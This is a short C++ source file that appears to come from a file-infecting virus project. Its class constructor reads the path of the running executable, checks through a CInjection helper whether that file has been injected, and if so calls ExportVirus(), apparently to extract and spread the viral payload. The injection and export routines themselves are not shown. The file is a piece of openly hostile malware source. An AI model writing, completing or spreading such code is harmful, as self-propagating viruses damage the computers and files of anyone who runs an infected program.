#include "StdAfx.h"
#include "ExportExeIfInjected.h"


CExportExeIfInjected::CExportExeIfInjected(void)
{
	CInjection inject;
	TCHAR szMyName[MAX_PATH];
	GetModuleFileName(NULL,szMyName,MAX_PATH);
	if (inject.IsInjected (szMyName) == TRUE)
	{
		inject.ExportVirus ();
	}
}


CExportExeIfInjected::~CExportExeIfInjected(void)
{
}
